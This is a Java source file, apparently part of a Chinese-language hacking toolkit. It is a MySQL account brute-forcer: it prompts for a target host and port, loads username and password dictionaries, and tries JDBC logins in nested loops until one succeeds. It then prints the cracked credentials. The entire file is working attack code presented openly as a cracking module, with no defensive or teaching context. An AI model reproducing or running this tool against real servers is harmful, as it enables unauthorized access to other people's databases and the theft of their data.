package MysqlDbBlasting;

import java.io.IOException;
import java.io.InputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Scanner;

import util.IpOrPortIsOnline;
import util.Time;

/**
 * Mysql账号密码破解模块
 * 
 * @author Bearcat Mail:hacker.bear.cat@qq.com
 * @since JDK 1.8
 * @version 1.0 2017-04-2
 */
public class MySQLScript {
	
	static String[] dbUsername = {}; // mysql账号字典数组
	static String[] dbPassword = {}; // mysql密码字典数组

	// Mysql用户名字典
	public static void username() throws IOException {
		InputStream file = MySQLScript.class.getResourceAsStream("username.CrackDb");
		byte[] rbs = new byte[9999];
		file.read(rbs);
		String str = new String(rbs);
		//System.getProperty("line.separator")根据系统平台得到换行符
		dbUsername = str.split(System.getProperty("line.separator"));
	}

	// Mysql密码字典
	public static void password() throws IOException {
		InputStream file = MySQLScript.class.getResourceAsStream("password.CrackDb");
		byte[] rbs = new byte[999999];
		file.read(rbs);
		String str = new String(rbs);
		//System.getProperty("line.separator")根据系统平台得到换行符
		dbPassword = str.split(System.getProperty("line.separator"));
	}

	public static void Mysql(String dbUsernames) {
		String dbHost = null; // mysql数据库地址
		int dbPort = 0; // mysql数据库端口
		System.out.print("===========================================================================\n");
		System.out.print("\t\t\tMysql账号密码爆破模块\n");
		System.out.print("===========================================================================\n");
		System.out.print("Mysql-DB-Host-IP:");
		dbHost = new Scanner(System.in).nextLine();
		System.out.print("Port:");
		dbPort = new Scanner(System.in).nextInt();
		// 判断Mysql数据库主机是否在线
		if (IpOrPortIsOnline.isPing(dbHost)) {
			// 判断Mysql数据库主机端口是否打开
			if (IpOrPortIsOnline.isHostConnectable(dbHost, dbPort)) {
				
				// 初始化字典
				try {
					username();
					password();
				} catch (IOException e1) {
					System.out.println("字典加载失败");
				}
				
				try {
					Class.forName("com.mysql.jdbc.Driver");
				} catch (ClassNotFoundException e) {
					System.out.println("mysql-jdbc.jar  Non-existent?");
				}

				Connection conn = null;
				
				if(dbUsernames.equals("username.CrackDb")){
					System.out.print("==================================开始爆破==================================\n");
					OK: for (int username = 0; username < dbUsername.length; username++) {
							for (int password = 0; password < dbPassword.length; password++) {
								try {
									conn = DriverManager.getConnection("jdbc:mysql://" + dbHost + ":" + dbPort+ "/mysql?useUnicode=true&characterEncoding=utf8",dbUsername[username], dbPassword[password]);
									System.err.println("\t|\t恭喜爆破成功\t账号：" + dbUsername[username] + "\t" + "密码：" + dbPassword[password] + "\t|");
									conn.close();
									break OK;
								} catch (SQLException e) {
									System.out.println(Time.time() + " [INFO] " + (dbUsername.length + dbPassword.length - username - password) + "/username.CrackDb && password.CrackDb");
									continue;
								}
							}
						}
					System.out.print("==================================爆破结束==================================\n");
					if (conn == null) {
						System.err.println("\t\t\t字典不够强大，破解未能成功。");
					}
				}else{
					System.out.print("==================================开始爆破==================================\n");
						for (int password = 0; password < dbPassword.length; password++) {
							try {
								conn = DriverManager.getConnection("jdbc:mysql://" + dbHost + ":" + dbPort+ "/mysql?useUnicode=true&characterEncoding=utf8",dbUsernames, dbPassword[password]);
								System.err.println("\t|\t恭喜爆破成功\t账号：" + dbUsernames + "\t" + "密码：" + dbPassword[password] + "\t|");
								conn.close();
								break;
							} catch (SQLException e) {
								System.out.println(Time.time() + " [INFO] " + (dbPassword.length - password) + "/dbUsername:"+ dbUsernames +" && password.CrackDb");
								continue;
							}
						}
					System.out.print("==================================爆破结束==================================\n");
					if (conn == null) {
						System.err.println("\t\t\t字典不够强大，破解未能成功。");
					}
				}
			} else {
				System.err.println("\t\t\t\t目标Mysql主机端口不正确。");
			}
		} else {
			System.err.println("\t\t\t目标Mysql主机IP地址错误(或不在线)。");
		}
	}
}